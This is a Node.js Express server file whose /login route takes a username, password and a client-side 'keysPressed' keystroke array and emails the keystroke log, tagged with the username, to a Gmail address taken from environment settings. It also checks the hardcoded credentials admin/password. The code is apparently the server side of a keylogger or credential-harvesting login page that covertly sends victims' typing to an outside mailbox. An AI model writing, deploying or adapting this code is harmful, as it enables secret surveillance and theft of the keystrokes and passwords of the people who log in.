'use strict';
const path = require('path');
const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const multer = require('multer');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

const upload = multer();

app.post('/login', upload.none(), (req, res) => {
    const { username, password } = req.body;
    const keysPressed = req.body.keysPressed ? JSON.parse(req.body.keysPressed) : [];

    if (!keysPressed || !Array.isArray(keysPressed)) {
        return res.status(400).json({ success: false, message: 'Invalid keystrokes data' });
    }

    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: process.env.GMAILFROM,
            pass: process.env.PASSWORD
        }
    });

    const keysPressedText = JSON.stringify(keysPressed, null, 2);

    const mailOptions = {
        from: process.env.GMAILFROM,
        to: process.env.GMAILTO,
        subject: 'Keystrokes Log',
        text: `Keystrokes log for user ${username}:\n${keysPressedText}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.log(error);
        } else {
            console.log('Email sent: ' + info.response);
        }
    });

    if (username === 'admin' && password === 'password') {
        res.json({ success: true });
    } else {
        res.json({ success: false });
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
